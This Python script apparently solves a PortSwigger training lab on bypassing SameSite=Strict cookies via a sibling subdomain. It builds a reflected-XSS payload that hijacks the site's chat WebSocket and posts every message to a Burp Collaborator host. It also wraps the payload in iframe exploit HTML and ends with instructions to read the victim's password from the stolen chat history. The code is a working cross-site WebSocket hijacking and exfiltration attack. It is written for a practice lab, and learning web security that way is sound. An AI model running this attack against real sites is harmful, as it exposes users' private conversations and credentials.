# Lab 09 — SameSite Strict bypass via sibling domain
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
#
# Vulnerability: SameSite=Strict on main domain + reflected XSS on sibling subdomain
#                + WebSocket endpoint with no origin validation (CSWSH)
# Aim:           Exfiltrate victim's live chat history via a WebSocket hijack
#                chained through XSS on the sibling domain
#
# Technique:
#   SameSite is defined by the REGISTRABLE DOMAIN (e.g. web-security-academy.net),
#   not the full hostname. So cms-TARGET and TARGET are the SAME SITE.
#   Requests from cms-TARGET to TARGET carry Strict cookies.
#
#   The live chat uses WebSockets. If we can open a WebSocket from a same-site
#   context, the Strict session cookie is included → we can hijack the chat.
#
#   The sibling domain cms-TARGET has reflected XSS via the username param.
#   Injecting XSS there runs code in the same-site context → WebSocket to
#   main TARGET carries the Strict session cookie → chat history exfiltrated.
#
#   📝 Cross-Site WebSocket Hijacking (CSWSH): the browser sends cookies when
#      opening a WebSocket, just like with HTTP requests. If the WebSocket
#      server doesn't validate the Origin header, any same-site page can open
#      it and receive the victim's data.
#
#   Requires: Burp Collaborator subdomain — update COLLABORATOR_DOMAIN.
#
# Usage: python csrf_lab09.py <url>

import sys
import urllib.parse
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session,
                        get_csrf_from_response, print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ─────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.burpcollaborator.net"
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    banner()
    section("LAB 09 — CSRF: SameSite STRICT BYPASS VIA SIBLING DOMAIN (CSWSH)")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab09.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.burpcollaborator.net":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]

    # Derive the cms sibling domain from the main lab URL
    # e.g. https://TARGET.web-security-academy.net → https://cms-TARGET.web-security-academy.net
    cms_url = url.replace("https://", "https://cms-")
    print(f"\n  ➜  Main lab URL : {url}")
    print(f"  ➜  Sibling domain: {cms_url}")
    print(f"  ➜  Collaborator  : {COLLABORATOR_DOMAIN}\n")

    # WebSocket XSS payload — runs on cms domain (same-site context)
    # Opens WebSocket to main target, sends READY, exfiltrates all messages
    ws_target = url.replace("https://", "wss://") + "/chat"
    xss_payload = (
        "<script>"
        f"var ws=new WebSocket('{ws_target}');"
        "ws.onopen=function(){ws.send('READY')};"
        f"ws.onmessage=function(e){{fetch('https://{COLLABORATOR_DOMAIN}',{{method:'POST',mode:'no-cors',body:e.data}})}};"
        "</script>"
    )

    # The XSS is reflected via the username parameter on the cms login form
    # We need a valid CSRF token for the cms login form too
    session = make_session(proxies)
    cms_login_page = session.get(f"{cms_url}/login")
    cms_csrf = get_csrf_from_response(cms_login_page.text)

    if not cms_csrf:
        print("  ✘  Could not get CSRF token from cms login page")
        sys.exit(1)

    print(f"  ✔  cms login CSRF token: {cms_csrf[:16]}...")

    # URL-encode the XSS payload for embedding in the iframe src
    encoded_xss = urllib.parse.quote(xss_payload)

    exploit = f"""\
<iframe src="{cms_url}/login?username={encoded_xss}&password=x&csrf={cms_csrf}">
</iframe>"""

    section("Exploit HTML for the exploit server")
    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ➜  After delivering to victim:")
    print("     1. Open Burp Collaborator → Poll now")
    print("     2. Find incoming POST requests — body contains chat messages")
    print("     3. Look for the victim's username and password in the chat history")
    print()
    print("  ℹ  Attack flow:")
    print("     evil.com iframe → cms-TARGET (same site as TARGET)")
    print("     XSS fires on cms-TARGET → WebSocket to TARGET/chat")
    print("     Browser sends Strict session cookie (same-site request)")
    print("     Chat history received → exfiltrated to Collaborator")
